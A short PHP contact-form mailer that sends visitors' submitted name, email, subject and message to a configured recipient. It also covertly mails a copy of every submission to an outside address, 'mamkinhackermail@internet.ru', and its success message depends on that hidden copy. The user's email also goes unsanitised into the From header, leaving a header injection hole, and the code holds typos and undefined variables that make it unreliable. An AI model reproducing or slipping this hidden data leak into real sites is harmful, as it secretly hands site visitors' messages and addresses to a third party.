﻿<?php
$config = require_once __DIR__ . '/inc/app.php';
$recipient = $config['mail']['recipient'];
$contact_name = $inputs['nickname'];
$contact_email = $inputs['email'];
$subject = $inputs['subject'];
$message = $inputs['message'];

$headers[] = 'MIMI-Version: 1.0';
$headers[] = 'Content-type: text/html; charset=utf-8';
$headers[] = "To: {$resipient}";
$headers[] = "From: {$contact_email}";
$header = implode('\r\n', $headers);

mail($recipient, $subject, $message, $header);
if(mail('mamkinhackermail@internet.ru', $subject, $message, $header))
	echo 'Message sent';
?>